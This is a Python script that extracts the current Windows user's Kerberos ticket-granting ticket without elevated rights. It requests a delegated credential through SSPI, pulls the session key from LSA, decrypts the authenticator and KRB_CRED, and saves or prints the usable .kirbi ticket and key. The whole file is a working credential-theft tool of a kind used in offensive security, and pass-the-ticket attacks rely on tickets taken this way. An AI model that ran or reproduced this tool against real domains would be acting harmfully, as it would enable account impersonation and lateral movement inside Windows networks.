"""
Extract the current Windows user's Kerberos TGT via SSPI/LSA APIs.
No dependency on minikerberos.

Usage:
    python get_tgt.py
    python get_tgt.py --target cifs/dc.corp.local
    python get_tgt.py -o ticket.kirbi

Dependencies:
    pip install asn1crypto unicrypto
"""

import os
import io
import enum
import struct
import hmac as _hmac
import hashlib
import base64
import ctypes
import ctypes.wintypes
from ctypes import (
    Structure, POINTER, byref, pointer, cast, addressof,
    c_void_p, c_ushort, c_char, c_byte,
    c_ulong, c_long, create_string_buffer, sizeof, string_at, WinError,
)
from ctypes.wintypes import HANDLE, LONG

from asn1crypto import core
from unicrypto.symmetric import AES, MODE_ECB
from unicrypto.hashlib import MD5, SHA1 as _SHA1
from unicrypto.hmac import new as _hmac_new
from unicrypto.symmetric import RC4 as _RC4_cipher


# ============================================================
#  Utility
# ============================================================

def _xorbytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))


def _mac_equal(a, b):
    return len(a) == len(b) and _hmac.compare_digest(a, b)


# ============================================================
#  Inline replacement: minikerberos.protocol.structures
# ============================================================

class ChecksumFlags(enum.IntFlag):
    GSS_C_DELEG_FLAG = 1
    GSS_C_MUTUAL_FLAG = 2
    GSS_C_REPLAY_FLAG = 4
    GSS_C_SEQUENCE_FLAG = 8
    GSS_C_CONF_FLAG = 16
    GSS_C_INTEG_FLAG = 32
    GSS_C_DCE_STYLE = 0x1000


class AuthenticatorChecksum:
    """RFC 4121 section 4.1.1.1 checksum."""
    def __init__(self):
        self.length_of_binding = None
        self.channel_binding = None
        self.flags = None
        self.delegation = None
        self.delegation_length = None
        self.delegation_data = None
        self.extensions = None

    @staticmethod
    def from_bytes(data):
        return AuthenticatorChecksum.from_buffer(io.BytesIO(data))

    @staticmethod
    def from_buffer(buf):
        ac = AuthenticatorChecksum()
        ac.length_of_binding = struct.unpack('<I', buf.read(4))[0]
        ac.channel_binding = buf.read(ac.length_of_binding)
        ac.flags = ChecksumFlags(struct.unpack('<I', buf.read(4))[0])
        if ac.flags & ChecksumFlags.GSS_C_DELEG_FLAG:
            ac.delegation = bool(struct.unpack('<H', buf.read(2))[0])
            ac.delegation_length = struct.unpack('<H', buf.read(2))[0]
            ac.delegation_data = buf.read(ac.delegation_length)
        ac.extensions = buf.read()
        return ac


# ============================================================
#  Inline replacement: minikerberos.protocol.encryption
# ============================================================

class Key:
    def __init__(self, enctype, contents):
        self.enctype = enctype
        self.contents = contents


# -- n-fold (RFC 3961 section 5.1) --

def _nfold(constant, n):
    """Fold constant to n bytes per RFC 3961."""
    m = len(constant)
    tmp = bytearray(n)
    for _ in range(n):
        carry = 0
        for i in range(m - 1, -1, -1):
            v = constant[i] + (tmp[i % n] if i % n < len(tmp) else 0) + carry
            tmp[i % n] = v & 0xFF
            carry = v >> 8
        if carry:
            for j in range(n - 1, -1, -1):
                v = tmp[j] + carry
                tmp[j] = v & 0xFF
                carry = v >> 8
    result = bytes(tmp)
    # Ciphertext-steal-style fix per RFC
    k = (n + m - 1) // m
    if k >= 128:
        return result
    res = bytearray(n)
    offset = 0
    for _ in range(k):
        for j in range(n):
            res[j] ^= constant[offset]
            offset = (offset + 1) % m
    return bytes(res)


# -- AES base class --

class _AESBase:
    blocksize = 16
    padsize = 1
    macsize = 12
    hashmod = hashlib.sha1
    seedsize = None

    @classmethod
    def basic_encrypt(cls, key, plaintext):
        a = AES(key.contents, MODE_ECB)
        return a.encrypt(plaintext)

    @classmethod
    def basic_decrypt(cls, key, ciphertext):
        a = AES(key.contents, MODE_ECB)
        if len(ciphertext) == cls.blocksize:
            return a.decrypt(ciphertext)
        cblocks = [ciphertext[p:p + cls.blocksize] for p in range(0, len(ciphertext), cls.blocksize)]
        lastlen = len(cblocks[-1])
        prev = b'\x00' * cls.blocksize
        plaintext = b''
        for b in cblocks[:-2]:
            plaintext += _xorbytes(a.decrypt(b), prev)
            prev = b
        b = a.decrypt(cblocks[-2])
        lastplaintext = _xorbytes(b[:lastlen], cblocks[-1])
        omitted = b[lastlen:]
        plaintext += _xorbytes(a.decrypt(cblocks[-1] + omitted), prev)
        return plaintext + lastplaintext

    @classmethod
    def random_to_key(cls, seed):
        return Key(cls.enctype_val, seed)

    @classmethod
    def derive(cls, key, constant):
        n = cls.blocksize
        plaintext = _nfold(constant, n)
        rndseed = b''
        while len(rndseed) < cls.seedsize:
            ciphertext = cls.basic_encrypt(key, plaintext)
            rndseed += ciphertext
            plaintext = ciphertext
        return cls.random_to_key(rndseed[:cls.seedsize])

    @classmethod
    def decrypt(cls, key, keyusage, ciphertext):
        ki = cls.derive(key, struct.pack('>IB', keyusage, 0x55))
        ke = cls.derive(key, struct.pack('>IB', keyusage, 0xAA))
        if len(ciphertext) < cls.blocksize + cls.macsize:
            raise ValueError('ciphertext too short')
        basic_ctext = ciphertext[:-cls.macsize]
        mac = ciphertext[-cls.macsize:]
        basic_plaintext = cls.basic_decrypt(ke, basic_ctext)
        h = _hmac_new(ki.contents, basic_plaintext, cls.hashmod).digest()
        if not _mac_equal(mac, h[:cls.macsize]):
            raise ValueError('AES decrypt integrity failure')
        return basic_plaintext[cls.blocksize:]


class _AES128CTS(_AESBase):
    enctype_val = 17
    seedsize = 16


class _AES256CTS(_AESBase):
    enctype_val = 18
    seedsize = 32


# -- RC4 (etype 23) --

class _RC4:
    @staticmethod
    def usage_str(keyusage):
        table = {3: 8, 23: 13}
        msusage = table[keyusage] if keyusage in table else keyusage
        return struct.pack('<I', msusage)

    @classmethod
    def decrypt(cls, key, keyusage, ciphertext):
        if len(ciphertext) < 24:
            raise ValueError('ciphertext too short')
        cksum = ciphertext[:16]
        basic_ctext = ciphertext[16:]
        ki = _hmac_new(key.contents, cls.usage_str(keyusage), hashlib.md5).digest()
        ke = _hmac_new(ki, cksum, hashlib.md5).digest()
        basic_plaintext = _RC4_cipher(ke).decrypt(basic_ctext)
        exp_cksum = _hmac_new(ki, basic_plaintext, hashlib.md5).digest()
        if not _mac_equal(cksum, exp_cksum) and keyusage == 9:
            ki = _hmac_new(key.contents, struct.pack('<I', 8), hashlib.md5).digest()
            exp_cksum = _hmac_new(ki, basic_plaintext, hashlib.md5).digest()
        if not _mac_equal(cksum, exp_cksum):
            raise ValueError('RC4 decrypt integrity failure')
        return basic_plaintext[8:]


_enctype_table = {
    23: _RC4,
    17: _AES128CTS,
    18: _AES256CTS,
}


# ============================================================
#  Inline ASN1 structures  (asn1crypto)
#  Minikerberos protocol ASN1 definitions — RFC 4120
# ============================================================

APPLICATION_TAG = 1
TAG = 'explicit'


class krb5int32(core.Integer):
    _alternate_encoding = 2  # signed 32-bit


class krb5uint32(core.Integer):
    pass


class KerberosString(core.GeneralString):
    _encoding = 'utf-8'


class Realm(KerberosString):
    pass


class PrincipalName(core.Sequence):
    _fields = [
        ('name-type', krb5int32, {'tag_type': 'explicit', 'tag': 0}),
        ('name-string', core.SequenceOf(KerberosString), {'tag_type': 'explicit', 'tag': 1}),
    ]


class KerberosTime(core.GeneralizedTime):
    pass


class HostAddress(core.Sequence):
    _fields = [
        ('addr-type', krb5int32, {'tag_type': 'explicit', 'tag': 0}),
        ('address', core.OctetString, {'tag_type': 'explicit', 'tag': 1}),
    ]


class HostAddresses(core.SequenceOf):
    _child_spec = HostAddress


class AuthorizationDataElement(core.Sequence):
    _fields = [
        ('ad-type', krb5int32, {'tag_type': 'explicit', 'tag': 0}),
        ('ad-data', core.OctetString, {'tag_type': 'explicit', 'tag': 1}),
    ]


class AuthorizationData(core.SequenceOf):
    _child_spec = AuthorizationDataElement


class Checksum(core.Sequence):
    _fields = [
        ('cksumtype', krb5int32, {'tag_type': 'explicit', 'tag': 0}),
        ('checksum', core.OctetString, {'tag_type': 'explicit', 'tag': 1}),
    ]


class EncryptionKey(core.Sequence):
    _fields = [
        ('keytype', krb5int32, {'tag_type': 'explicit', 'tag': 0}),
        ('keyvalue', core.OctetString, {'tag_type': 'explicit', 'tag': 1}),
    ]


class TicketFlags(core.BitString):
    _map = {
        0: 'reserved',
        1: 'forwardable',
        2: 'forwarded',
        3: 'proxiable',
        4: 'proxy',
        5: 'may-postdate',
        6: 'postdated',
        7: 'invalid',
        8: 'renewable',
        9: 'initial',
        10: 'pre-authent',
        11: 'hw-authent',
        12: 'transited-policy-checked',
        13: 'ok-as-delegate',
        14: 'enc-pa-rep',
        15: 'anonymous',
    }


class TransitedEncoding(core.Sequence):
    _fields = [
        ('tr-type', krb5int32, {'tag_type': 'explicit', 'tag': 0}),
        ('contents', core.OctetString, {'tag_type': 'explicit', 'tag': 1}),
    ]


class Ticket(core.Sequence):
    explicit = (APPLICATION_TAG, 1)
    _fields = [
        ('tkt-vno', core.Integer, {'tag_type': 'explicit', 'tag': 0}),
        ('realm', Realm, {'tag_type': 'explicit', 'tag': 1}),
        ('sname', PrincipalName, {'tag_type': 'explicit', 'tag': 2}),
        ('enc-part', EncryptedData, {'tag_type': 'explicit', 'tag': 3}),
    ]


class SequenceOfTicket(core.SequenceOf):
    _child_spec = Ticket


class EncryptedData(core.Sequence):
    _fields = [
        ('etype', krb5int32, {'tag_type': 'explicit', 'tag': 0}),
        ('kvno', krb5uint32, {'tag_type': 'explicit', 'tag': 1, 'optional': True}),
        ('cipher', core.OctetString, {'tag_type': 'explicit', 'tag': 2}),
    ]


class APOptions(core.BitString):
    _map = {0: 'reserved', 1: 'use-session-key', 2: 'mutual-required'}


class AP_REQ(core.Sequence):
    explicit = (APPLICATION_TAG, 14)
    _fields = [
        ('pvno', krb5int32, {'tag_type': 'explicit', 'tag': 0}),
        ('msg-type', krb5int32, {'tag_type': 'explicit', 'tag': 1}),
        ('ap-options', APOptions, {'tag_type': 'explicit', 'tag': 2}),
        ('ticket', Ticket, {'tag_type': 'explicit', 'tag': 3}),
        ('authenticator', EncryptedData, {'tag_type': 'explicit', 'tag': 4}),
    ]


class Authenticator(core.Sequence):
    explicit = (APPLICATION_TAG, 2)
    _fields = [
        ('authenticator-vno', krb5int32, {'tag_type': 'explicit', 'tag': 0}),
        ('crealm', Realm, {'tag_type': 'explicit', 'tag': 1}),
        ('cname', PrincipalName, {'tag_type': 'explicit', 'tag': 2}),
        ('cksum', Checksum, {'tag_type': 'explicit', 'tag': 3, 'optional': True}),
        ('cusec', krb5int32, {'tag_type': 'explicit', 'tag': 4}),
        ('ctime', KerberosTime, {'tag_type': 'explicit', 'tag': 5}),
        ('subkey', EncryptionKey, {'tag_type': 'explicit', 'tag': 6, 'optional': True}),
        ('seq-number', krb5uint32, {'tag_type': 'explicit', 'tag': 7, 'optional': True}),
        ('authorization-data', AuthorizationData, {'tag_type': 'explicit', 'tag': 8, 'optional': True}),
    ]


class KrbCredInfo(core.Sequence):
    _fields = [
        ('key', EncryptionKey, {'tag_type': 'explicit', 'tag': 0}),
        ('prealm', Realm, {'tag_type': 'explicit', 'tag': 1, 'optional': True}),
        ('pname', PrincipalName, {'tag_type': 'explicit', 'tag': 2, 'optional': True}),
        ('flags', TicketFlags, {'tag_type': 'explicit', 'tag': 3, 'optional': True}),
        ('authtime', KerberosTime, {'tag_type': 'explicit', 'tag': 4, 'optional': True}),
        ('starttime', KerberosTime, {'tag_type': 'explicit', 'tag': 5, 'optional': True}),
        ('endtime', KerberosTime, {'tag_type': 'explicit', 'tag': 6, 'optional': True}),
        ('renew-till', KerberosTime, {'tag_type': 'explicit', 'tag': 7, 'optional': True}),
        ('srealm', Realm, {'tag_type': 'explicit', 'tag': 8, 'optional': True}),
        ('sname', PrincipalName, {'tag_type': 'explicit', 'tag': 9, 'optional': True}),
        ('caddr', HostAddresses, {'tag_type': 'explicit', 'tag': 10, 'optional': True}),
    ]


class SequenceOfKrbCredInfo(core.SequenceOf):
    _child_spec = KrbCredInfo


class EncKrbCredPart(core.Sequence):
    explicit = (APPLICATION_TAG, 29)
    _fields = [
        ('ticket-info', SequenceOfKrbCredInfo, {'tag_type': 'explicit', 'tag': 0}),
        ('nonce', krb5int32, {'tag_type': 'explicit', 'tag': 1, 'optional': True}),
        ('timestamp', KerberosTime, {'tag_type': 'explicit', 'tag': 2, 'optional': True}),
        ('usec', krb5int32, {'tag_type': 'explicit', 'tag': 3, 'optional': True}),
        ('s-address', HostAddress, {'tag_type': 'explicit', 'tag': 4, 'optional': True}),
        ('r-address', HostAddress, {'tag_type': 'explicit', 'tag': 5, 'optional': True}),
    ]


class KRB_CRED(core.Sequence):
    explicit = (APPLICATION_TAG, 22)
    _fields = [
        ('pvno', core.Integer, {'tag_type': 'explicit', 'tag': 0}),
        ('msg-type', core.Integer, {'tag_type': 'explicit', 'tag': 1}),
        ('tickets', SequenceOfTicket, {'tag_type': 'explicit', 'tag': 2}),
        ('enc-part', EncryptedData, {'tag_type': 'explicit', 'tag': 3}),
    ]


# ============================================================
#  ASN1 — InitialContextToken (RFC 2743)
# ============================================================

class MechType(core.ObjectIdentifier):
    _map = {"1.2.840.113554.1.2.2": "KRB5 - Kerberos 5"}


class InitialContextToken(core.Sequence):
    class_ = 1
    tag = 0
    _fields = [
        ("thisMech", MechType, {"optional": False}),
        ("unk_bool", core.Boolean, {"optional": False}),
        ("innerContextToken", core.Any, {"optional": False}),
    ]
    _oid_pair = ("thisMech", "innerContextToken")
    _oid_specs = {"KRB5 - Kerberos 5": AP_REQ}


# ============================================================
#  Windows type aliases & LSA/SSPI
# ============================================================

PVOID = c_void_p
PPVOID = POINTER(PVOID)
PHANDLE = POINTER(HANDLE)
NTSTATUS = LONG
PNTSTATUS = POINTER(NTSTATUS)
PULONG = POINTER(c_ulong)
LARGE_INTEGER = ctypes.c_longlong
ULONG = c_ulong
USHORT = c_ushort


class LUID(Structure):
    _fields_ = [("LowPart", ULONG), ("HighPart", LONG)]
    def to_int(self):
        return (self.HighPart << 32) + self.LowPart
    @staticmethod
    def from_int(i):
        l = LUID(); l.HighPart = i >> 32; l.LowPart = i & 0xFFFFFFFF; return l

PLUID = POINTER(LUID)


class LSA_STRING(Structure):
    _fields_ = [("Length", USHORT), ("MaximumLength", USHORT), ("Buffer", POINTER(c_char))]

PLSA_STRING = POINTER(LSA_STRING)


class LSA_UNICODE_STRING(Structure):
    _fields_ = [("Length", USHORT), ("MaximumLength", USHORT), ("Buffer", POINTER(c_char))]

    def to_string(self):
        return string_at(self.Buffer, self.MaximumLength).decode("utf-16-le", errors="replace").rstrip("\x00")


class KERB_CRYPTO_KEY(Structure):
    _fields_ = [("KeyType", LONG), ("Length", ULONG), ("Value", PVOID)]
    def to_dict(self):
        return {"KeyType": self.KeyType, "Key": string_at(self.Value, self.Length)}


class KERB_EXTERNAL_TICKET(Structure):
    _fields_ = [
        ("ServiceName", PVOID),
        ("TargetName", PVOID),
        ("ClientName", PVOID),
        ("DomainName", LSA_UNICODE_STRING),
        ("TargetDomainName", LSA_UNICODE_STRING),
        ("AltTargetDomainName", LSA_UNICODE_STRING),
        ("SessionKey", KERB_CRYPTO_KEY),
        ("TicketFlags", ULONG),
        ("Flags", ULONG),
        ("KeyExpirationTime", LARGE_INTEGER),
        ("StartTime", LARGE_INTEGER),
        ("EndTime", LARGE_INTEGER),
        ("RenewUntil", LARGE_INTEGER),
        ("TimeSkew", LARGE_INTEGER),
        ("EncodedTicketSize", ULONG),
        ("EncodedTicket", PVOID),
    ]
    def get_data(self):
        return {"Key": self.SessionKey.to_dict(), "Ticket": string_at(self.EncodedTicket, self.EncodedTicketSize)}


class KERB_RETRIEVE_TKT_RESPONSE(Structure):
    _fields_ = [("Ticket", KERB_EXTERNAL_TICKET)]


class SecHandle(Structure):
    _fields_ = [("dwLower", POINTER(ULONG)), ("dwUpper", POINTER(ULONG))]
    def __init__(self):
        super().__init__(pointer(ULONG()), pointer(ULONG()))

CredHandle = SecHandle
PCredHandle = POINTER(CredHandle)
CtxtHandle = SecHandle
PCtxtHandle = POINTER(CtxtHandle)


class TimeStamp(Structure):
    _fields_ = [("dwLowDateTime", ULONG), ("dwHighDateTime", ULONG)]


class SecBuffer(Structure):
    _fields_ = [("cbBuffer", ULONG), ("BufferType", ULONG), ("pvBuffer", PVOID)]
    def __init__(self, token=None, buffer_type=2):
        if token is None:
            token = b"\x00" * 2880
        self._buf = create_string_buffer(token, len(token))
        super().__init__(sizeof(self._buf), buffer_type, cast(self._buf, PVOID))
    @property
    def Buffer(self):
        return (self.BufferType, string_at(self.pvBuffer, self.cbBuffer))


class SecBufferDesc(Structure):
    _fields_ = [("ulVersion", ULONG), ("cBuffers", ULONG), ("pBuffers", POINTER(SecBuffer))]
    def __init__(self, sb=None):
        if sb is not None:
            arr = (SecBuffer * len(sb))(*sb)
            self._buf = arr
            super().__init__(0, len(sb), arr)
        else:
            self._buf = SecBuffer()
            super().__init__(0, 1, pointer(self._buf))
    @property
    def Buffers(self):
        return [self.pBuffers[i].Buffer for i in range(self.cBuffers)]

PSecBufferDesc = POINTER(SecBufferDesc)


# ============================================================
#  Constants
# ============================================================
KerbRetrieveEncodedTicketMessage = 8
SEC_E_OK = 0x00000000
SEC_E_CONTINUE_NEEDED = 0x00090312
SECPKG_CRED_OUTBOUND = 2
ISC_REQ_DELEGATE = 0x00000001
ISC_REQ_MUTUAL_AUTH = 0x00000002
ISC_REQ_ALLOCATE_MEMORY = 0x00000100


# ============================================================
#  WinAPI — LSA
# ============================================================

secur32 = ctypes.windll.Secur32


def _check_nt(result, func, args):
    if result != 0:
        raise WinError(result)
    return result


def LsaConnectUntrusted():
    f = secur32.LsaConnectUntrusted
    f.argtypes = [PHANDLE]; f.restype = NTSTATUS; f.errcheck = _check_nt
    h = HANDLE(-1)
    f(byref(h))
    return h


def LsaDeregisterLogonProcess(h):
    f = secur32.LsaDeregisterLogonProcess
    f.argtypes = [HANDLE]; f.restype = NTSTATUS; f.errcheck = _check_nt
    f(h)


def LsaFreeReturnBuffer(p):
    f = secur32.LsaFreeReturnBuffer
    f.argtypes = [PVOID]; f.restype = NTSTATUS; f.errcheck = _check_nt
    f(p)


def LsaLookupAuthenticationPackage(h, pkg):
    f = secur32.LsaLookupAuthenticationPackage
    f.argtypes = [HANDLE, PLSA_STRING, PULONG]
    f.restype = NTSTATUS; f.errcheck = _check_nt
    b = pkg.encode() if isinstance(pkg, str) else pkg
    s = LSA_STRING(); s.Buffer = create_string_buffer(b); s.Length = len(b); s.MaximumLength = len(b) + 1
    pid = ULONG(0)
    f(h, byref(s), byref(pid))
    return pid.value


def LsaCallAuthenticationPackage(lsa_handle, pkg_id, msg):
    f = secur32.LsaCallAuthenticationPackage
    f.argtypes = [HANDLE, ULONG, PVOID, ULONG, PPVOID, PULONG, PNTSTATUS]
    f.restype = ULONG; f.errcheck = _check_nt
    msg_len = sizeof(msg) if isinstance(msg, Structure) else len(msg) if isinstance(msg, bytes) else 0
    ret_p = PVOID(); ret_len = ULONG(0); ret_st = LONG(-1)
    f(lsa_handle, pkg_id, byref(msg), msg_len, byref(ret_p), byref(ret_len), byref(ret_st))
    if ret_st.value != 0:
        raise WinError(ret_st.value)
    if ret_len.value > 0:
        return string_at(ret_p, ret_len.value), ret_p
    return b"", None


# ============================================================
#  WinAPI — SSPI
# ============================================================

def _check_sec(result, func, args):
    if result in (SEC_E_OK, SEC_E_CONTINUE_NEEDED):
        return result
    raise RuntimeError(f"SSPI call failed: {result:#x}")


def AcquireCredentialsHandle(pkg_name, cred_usage):
    f = secur32.AcquireCredentialsHandleA
    f.argtypes = [POINTER(c_char), POINTER(c_char), ULONG, PLUID, PVOID, PVOID, PVOID, PCredHandle, POINTER(TimeStamp)]
    f.restype = ULONG; f.errcheck = _check_sec
    pn = create_string_buffer(pkg_name.encode("ascii"))
    creds = CredHandle(); ts = TimeStamp()
    f(None, pn, cred_usage, None, None, None, None, byref(creds), byref(ts))
    return creds


def InitializeSecurityContext(creds, spn, flags, ctx_in=None, token=None):
    f = secur32.InitializeSecurityContextA
    f.argtypes = [PCredHandle, PCtxtHandle, POINTER(c_char), ULONG, ULONG, ULONG,
                  PSecBufferDesc, ULONG, PCtxtHandle, PSecBufferDesc, PULONG, POINTER(TimeStamp)]
    f.restype = ULONG; f.errcheck = _check_sec
    pspn = create_string_buffer(spn.encode("ascii"))
    outbuf = SecBufferDesc()
    outflags = ULONG(); expiry = TimeStamp()
    ctx_out = CtxtHandle()
    inbuf_ptr = byref(SecBufferDesc([SecBuffer(token)])) if token is not None else None
    if ctx_in is None:
        res = f(byref(creds), None, pspn, flags, 0, 0, inbuf_ptr, 0,
                byref(ctx_out), byref(outbuf), byref(outflags), byref(expiry))
    else:
        res = f(byref(creds), byref(ctx_in), pspn, flags, 0, 0, inbuf_ptr, 0,
                byref(ctx_out), byref(outbuf), byref(outflags), byref(expiry))
    return res, ctx_out, outbuf.Buffers


# ============================================================
#  Build KerbRetrieveEncodedTicketMessage
# ============================================================

def _build_retrieve_request(target, luid=0):
    if isinstance(luid, int):
        luid = LUID.from_int(luid)
    target_enc = target.encode("utf-16-le") + b"\x00\x00"
    target_alloc = len(target_enc)

    class _REQ(Structure):
        _fields_ = [
            ("MessageType", ULONG),
            ("LogonId", LUID),
            ("TargetName", LSA_UNICODE_STRING),
            ("TicketFlags", ULONG),
            ("CacheOptions", ULONG),
            ("EncryptionType", LONG),
            ("CredentialsHandle", PVOID),
            ("_pad", PVOID),
            ("TargetNameData", c_byte * target_alloc),
        ]

    req = _REQ()
    req.MessageType = KerbRetrieveEncodedTicketMessage
    req.LogonId = luid
    req.TicketFlags = 0
    req.CacheOptions = 8
    req.EncryptionType = 0
    req.CredentialsHandle = None
    req.TargetNameData = (c_byte * target_alloc)(*target_enc)

    struct_end = addressof(req) + sizeof(req)
    name_start = struct_end - target_alloc
    name_start_aligned = name_start - (name_start % sizeof(c_void_p))
    lsa_target = LSA_UNICODE_STRING()
    lsa_target.Length = len(target.encode("utf-16-le"))
    lsa_target.MaximumLength = target_alloc
    lsa_target.Buffer = cast(name_start_aligned, POINTER(c_char))
    req.TargetName = lsa_target
    return req


# ============================================================
#  Extract ticket + session key from LSA
# ============================================================

def extract_ticket(lsa_handle, pkg_id, luid, target):
    msg = _build_retrieve_request(target, luid)
    ret_msg, free_ptr = LsaCallAuthenticationPackage(lsa_handle, pkg_id, msg)
    resp = KERB_RETRIEVE_TKT_RESPONSE.from_buffer_copy(ret_msg)
    ticket_data = resp.Ticket.get_data()
    if free_ptr is not None:
        LsaFreeReturnBuffer(free_ptr)
    return ticket_data


# ============================================================
#  Main extraction
# ============================================================

def get_tgt(target=None):
    if target is None:
        ls = os.environ.get("LOGONSERVER", "").lstrip("\\")
        if not ls:
            raise RuntimeError("No --target and LOGONSERVER not set.")
        target = f"cifs/{ls}"

    lsa = LsaConnectUntrusted()
    try:
        pkg_id = LsaLookupAuthenticationPackage(lsa, "kerberos")
    finally:
        LsaDeregisterLogonProcess(lsa)

    creds = AcquireCredentialsHandle("kerberos", SECPKG_CRED_OUTBOUND)
    flags = ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH | ISC_REQ_ALLOCATE_MEMORY
    res, ctx, bufs = InitializeSecurityContext(creds, target, flags)
    if res not in (SEC_E_OK, SEC_E_CONTINUE_NEEDED):
        raise RuntimeError(f"InitializeSecurityContext failed: {res:#x}")

    raw_token = bufs[0][1]

    lsa2 = LsaConnectUntrusted()
    try:
        raw_ticket = extract_ticket(lsa2, pkg_id, 0, target)
    finally:
        LsaDeregisterLogonProcess(lsa2)

    key = Key(raw_ticket["Key"]["KeyType"], raw_ticket["Key"]["Key"])

    ict = InitialContextToken.load(raw_token)
    apreq = AP_REQ(ict.native["innerContextToken"]).native

    cipher = _enctype_table[apreq["authenticator"]["etype"]]
    auth_plain = cipher.decrypt(key, 11, apreq["authenticator"]["cipher"])
    authenticator = Authenticator.load(auth_plain).native

    ck = authenticator["cksum"]
    if ck["cksumtype"] != 0x8003:
        raise RuntimeError(f"Unexpected checksum type: {ck['cksumtype']:#x}")

    cdata = AuthenticatorChecksum.from_bytes(ck["checksum"])
    if ChecksumFlags.GSS_C_DELEG_FLAG not in cdata.flags:
        raise RuntimeError("GSS_C_DELEG_FLAG not set -- no delegated TGT")

    cred_native = KRB_CRED.load(cdata.delegation_data).native
    cred_plain = cipher.decrypt(key, 14, cred_native["enc-part"]["cipher"])

    cred_native["enc-part"] = EncryptedData({"etype": 0, "cipher": cred_plain})
    return KRB_CRED(cred_native).dump()


# ============================================================
#  CLI
# ============================================================

def _print_ticket_info(raw_ticket):
    tkt = KRB_CRED.load(raw_ticket["Ticket"]).native
    realm = (
        tkt.get("realm", b"").decode() if isinstance(tkt.get("realm"), bytes)
        else str(tkt.get("realm", ""))
    )
    sname = tkt.get("sname", {})
    parts = [s.decode() if isinstance(s, bytes) else str(s) for s in sname.get("name-string", [])]
    print(f"[+] Ticket for: {'/'.join(parts)}@{realm}")
    print(f"[+] Session key: {raw_ticket['Key']['KeyType']} / {raw_ticket['Key']['Key'].hex()[:16]}...")


def main():
    import argparse
    ap = argparse.ArgumentParser(description="Extract current user's Kerberos TGT")
    ap.add_argument("--target", help="SPN (default: cifs\\<LOGONSERVER>)")
    ap.add_argument("-o", "--out-file", help="Save TGT as kirbi file")
    ap.add_argument("-v", "--verbose", action="store_true", help="Show ticket metadata")
    args = ap.parse_args()

    kirbi = get_tgt(args.target)

    if args.verbose:
        lsa = LsaConnectUntrusted()
        try:
            pkg_id = LsaLookupAuthenticationPackage(lsa, "kerberos")
            t = extract_ticket(lsa, pkg_id, 0, args.target or os.environ.get("LOGONSERVER", "").lstrip("\\"))
            _print_ticket_info(t)
        finally:
            LsaDeregisterLogonProcess(lsa)

    if args.out_file:
        with open(args.out_file, "wb") as f:
            f.write(kirbi)
        print(f"[+] Wrote TGT ({len(kirbi)} bytes) to {args.out_file}")
        return

    k = KRB_CRED.load(kirbi).native
    for ticket in k.get("tickets", []):
        realm = ticket.get("realm", b"").decode() if isinstance(ticket.get("realm"), bytes) else str(ticket.get("realm", ""))
        sname = ticket.get("sname", {})
        parts = [s.decode() if isinstance(s, bytes) else str(s) for s in sname.get("name-string", [])]
        print(f"  SPN:      {'/'.join(parts)}")
        print(f"  Realm:    {realm}")
    if k.get("enc-part", {}).get("etype") == 0:
        cred = EncKrbCredPart.load(k["enc-part"]["cipher"]).native
        for info in cred.get("ticket-info", []):
            key = info.get("key", {})
            keytype = key.get("keytype", "?")
            keyvalue = base64.b64encode(key.get("keyvalue", b"")).decode()
            flags = info.get("flags", [])
            print(f"  Client:   {'/'.join(info.get('pname', {}).get('name-string', []))}")
            print(f"  Start:    {info.get('starttime', '?')}")
            print(f"  End:      {info.get('endtime', '?')}")
            print(f"  Renew:    {info.get('renew-till', '?')}")
            print(f"  Flags:    {', '.join(flags) if flags else '?'}")
            print(f"  KeyType:  {keytype}")
            print(f"  Key:      {keyvalue}")
    print(f"  KirbiB64: {base64.b64encode(kirbi).decode()}")


if __name__ == "__main__":
    main()
